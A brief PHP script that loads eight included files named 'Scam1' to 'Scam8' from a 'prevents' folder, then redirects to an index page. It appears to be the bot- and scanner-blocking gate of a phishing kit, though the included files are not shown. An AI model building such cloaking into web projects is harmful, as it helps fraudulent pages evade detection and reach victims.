<?php
  	include '../../prevents/Scam1.php';
    include '../../prevents/Scam2.php';
    include '../../prevents/Scam3.php';
    include '../../prevents/Scam4.php';
    include '../../prevents/Scam5.php';
    include '../../prevents/Scam6.php';
    include '../../prevents/Scam7.php';
    include '../../prevents/Scam8.php';
	exit(header("Location: ../index.php"));
?>
